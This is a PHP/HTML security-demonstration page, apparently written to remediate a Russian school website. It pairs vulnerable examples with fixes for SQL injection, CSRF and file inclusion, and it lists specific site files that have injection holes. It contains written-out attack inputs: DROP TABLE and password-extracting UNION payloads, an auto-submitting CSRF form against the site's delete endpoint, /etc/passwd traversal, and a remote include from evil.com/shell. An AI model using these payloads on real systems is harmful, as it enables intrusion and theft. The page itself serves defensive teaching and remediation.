<?php
// SAFE Security Testing Script - For Educational Purposes Only
// This demonstrates vulnerabilities WITHOUT causing damage

session_start();
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Security Vulnerability Test (SAFE)</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; }
        .warning { background: #fee; border: 2px solid #c00; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .safe { background: #efe; border: 2px solid #0a0; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .demo { background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px; }
        pre { background: #333; color: #fff; padding: 10px; overflow-x: auto; }
        .vulnerable { color: #c00; font-weight: bold; }
        .secure { color: #0a0; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔒 Security Vulnerability Demonstration</h1>
    
    <div class="warning">
        <h2>⚠️ WARNING</h2>
        <p>This page demonstrates security vulnerabilities for educational purposes only.</p>
        <p>DO NOT use these techniques on production systems or without permission.</p>
    </div>

    <h2>1. SQL Injection Demonstration</h2>
    
    <div class="demo">
        <h3>Vulnerable Query Example:</h3>
        <pre>
// VULNERABLE CODE:
$keyword = $_GET['search'];
$query = "SELECT * FROM news WHERE title LIKE '%$keyword%'";
        </pre>
        
        <h3>Attack Vectors:</h3>
        <p>An attacker could input:</p>
        <ul>
            <li><code>test' OR '1'='1</code> - Returns all records</li>
            <li><code>test'; DROP TABLE users; --</code> - Attempts to drop table</li>
            <li><code>test' UNION SELECT password FROM users --</code> - Attempts data extraction</li>
        </ul>
        
        <h3>What happens:</h3>
        <pre>
// Resulting query with malicious input:
SELECT * FROM news WHERE title LIKE '%test' OR '1'='1%'
// This returns ALL news items, not just matching ones
        </pre>
    </div>

    <div class="safe">
        <h3>✅ Secure Version:</h3>
        <pre>
// SECURE CODE:
$stmt = $connection->prepare("SELECT * FROM news WHERE title LIKE ?");
$searchTerm = '%' . $keyword . '%';
$stmt->bind_param("s", $searchTerm);
$stmt->execute();
        </pre>
    </div>

    <h2>2. CSRF Attack Demonstration</h2>
    
    <div class="demo">
        <h3>How CSRF Works:</h3>
        <p>1. User is logged into 11klassniki.ru</p>
        <p>2. User visits malicious site with this code:</p>
        <pre>
&lt;form action="https://11klassniki.ru/delete-post.php" method="POST" id="csrf"&gt;
    &lt;input type="hidden" name="post_id" value="123"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
        </pre>
        <p>3. The form auto-submits, deleting post 123 without user's knowledge!</p>
    </div>

    <div class="safe">
        <h3>✅ CSRF Protection:</h3>
        <pre>
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// In form
&lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;

// Verify
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}
        </pre>
    </div>

    <h2>3. File Inclusion Vulnerability</h2>
    
    <div class="demo">
        <h3>Vulnerable Code:</h3>
        <pre>
// VULNERABLE:
$page = $_GET['page'];
include($page . '.php');

// Attack: ?page=../../../etc/passwd
// Or: ?page=http://evil.com/shell
        </pre>
    </div>

    <div class="safe">
        <h3>✅ Secure Version:</h3>
        <pre>
// SECURE:
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    include('404.php');
}
        </pre>
    </div>

    <h2>4. Test Vulnerable Files</h2>
    
    <div class="demo">
        <h3>Files with SQL Injection Vulnerabilities:</h3>
        <ol>
            <li class="vulnerable">analyze-news-categories.php - Direct concatenation in query</li>
            <li class="vulnerable">dashboard-comments-new.php - LIKE clause vulnerability</li>
            <li class="vulnerable">dashboard-vpo-functional.php - Search vulnerability</li>
            <li class="vulnerable">dashboard-schools-new.php - Search vulnerability</li>
        </ol>
        
        <h3>Safe Test Query:</h3>
        <p>To test if a search field is vulnerable (without causing damage):</p>
        <pre>
Input: test' AND '1'='1
If vulnerable: Returns results
If secure: No results or error
        </pre>
    </div>

    <h2>5. Security Headers Check</h2>
    
    <?php
    $headers = [
        'X-Frame-Options' => 'Prevents clickjacking',
        'X-Content-Type-Options' => 'Prevents MIME sniffing',
        'X-XSS-Protection' => 'XSS filter (deprecated but still useful)',
        'Content-Security-Policy' => 'Controls resource loading',
        'Strict-Transport-Security' => 'Forces HTTPS'
    ];
    
    echo "<div class='demo'>";
    echo "<h3>Current Security Headers:</h3>";
    echo "<ul>";
    
    $response_headers = headers_list();
    foreach ($headers as $header => $description) {
        $found = false;
        foreach ($response_headers as $rh) {
            if (stripos($rh, $header) !== false) {
                echo "<li class='secure'>✅ $header - $description</li>";
                $found = true;
                break;
            }
        }
        if (!$found) {
            echo "<li class='vulnerable'>❌ $header - $description (MISSING)</li>";
        }
    }
    echo "</ul>";
    echo "</div>";
    ?>

    <h2>6. Quick Security Checklist</h2>
    
    <div class="demo">
        <form method="POST" style="line-height: 2;">
            <label><input type="checkbox"> Fixed SQL injection in analyze-news-categories.php</label><br>
            <label><input type="checkbox"> Fixed SQL injection in dashboard files</label><br>
            <label><input type="checkbox"> Added CSRF tokens to all forms</label><br>
            <label><input type="checkbox"> Implemented Content Security Policy</label><br>
            <label><input type="checkbox"> Added input validation</label><br>
            <label><input type="checkbox"> Configured security headers</label><br>
            <label><input type="checkbox"> Reviewed file upload security</label><br>
            <label><input type="checkbox"> Implemented rate limiting</label><br>
        </form>
    </div>

    <div class="warning">
        <h2>🚨 Action Required</h2>
        <p><strong>Priority 1:</strong> Fix SQL injection vulnerabilities immediately</p>
        <p><strong>Priority 2:</strong> Implement CSRF protection</p>
        <p><strong>Priority 3:</strong> Add security headers</p>
        <p><strong>Remember:</strong> Security testing should only be done on systems you own or have permission to test.</p>
    </div>

</body>
</html>